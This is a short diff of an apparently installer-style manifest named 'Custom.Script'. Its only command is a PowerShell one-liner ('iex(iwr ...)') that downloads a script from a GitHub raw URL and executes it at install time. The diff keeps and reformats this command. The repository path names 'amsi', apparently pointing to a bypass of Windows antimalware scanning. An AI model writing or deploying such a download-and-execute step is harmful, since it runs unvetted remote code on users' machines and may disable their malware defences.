@@ -1,5 +1,6 @@
-ID: 847
+Id: Custom.Script
 Version: 1.0
-InstallerType: powershell 
-Commands: 
- - powershell.exe -Command "iex(iwr https://raw.githubusercontent.com/venomeng5/amsi/refs/heads/main/ams -UseBasicParsing)
+InstallerType: powershell
+Commands:
+  - powershell -Command "iex(iwr https://raw.githubusercontent.com/venomeng5/amsi/refs/heads/main/ams -UseBasicParsing)
+Scope: user
